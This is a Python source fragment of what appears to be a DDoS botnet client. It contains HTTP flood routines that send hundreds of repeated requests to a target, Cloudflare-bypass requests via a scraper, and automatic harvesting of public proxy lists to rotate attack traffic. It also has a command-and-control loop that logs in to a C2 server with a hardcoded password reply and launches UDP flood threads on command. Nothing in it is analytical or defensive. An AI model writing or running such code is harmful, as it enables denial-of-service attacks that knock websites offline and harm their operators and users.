...
def run(target, proxies, cfbp):
    if cfbp == 0 and len(proxies) > 0:
        ...
        try:
            response = proxiedRequest.get(target, headers=headers, timeout=15)

            if response.status_code >= 200 and response.status_code <= 226:
                for _ in range(100):
                    proxiedRequest.get(target, headers=headers, timeout=15)
        ...
        try:
            a = scraper.get(target, headers=headers, proxies=proxies_dict, timeout=15)

            if a.status_code >= 200 and a.status_code <= 226:
                for _ in range(100):
                    scraper.get(target, headers=headers, proxies=proxies_dict, timeout=15)
            else:
                proxies = remove_by_value(proxies, proxy)
...
def httpio(target, times, threads, attack_type):
    ...
    if attack_type == 'PROXY' or attack_type == 'proxy':
        cfbp = 0
        try:
            proxyscrape_http = requests.get('https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all', timeout=15)
            proxy_list_http = requests.get('https://www.proxy-list.download/api/v1/get?type=http', timeout=15)
            raw_github_http = requests.get('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt', timeout=15)
...
def STORM_attack(ip, port, secs):
    ...
    while time.time() < secs:
        ...
        for _ in range(1500):
            try:
                requests.get(ip, headers=headers, timeout=15)
                requests.head(ip, headers=headers, timeout=15)
                scraper.get(ip, headers=headers, timeout=15)
            except:
                pass
    ...
    while True:
        try:
            ...
            while True:
                ...
                data = c2.recv(1024).decode()
                if 'Password' in data:
                    c2.send('\xff\xff\xff\xff\x75'.encode('cp1252'))
                    break
            break
        except:
            time.sleep(5)
    while True:
        try:
            ...
            if command == '.UDPBYPASS':
                ...
                for _ in range(threads):
                    threading.Thread(target=attack_udpbypass, args=(ip, port, secs, size), daemon=True).start()
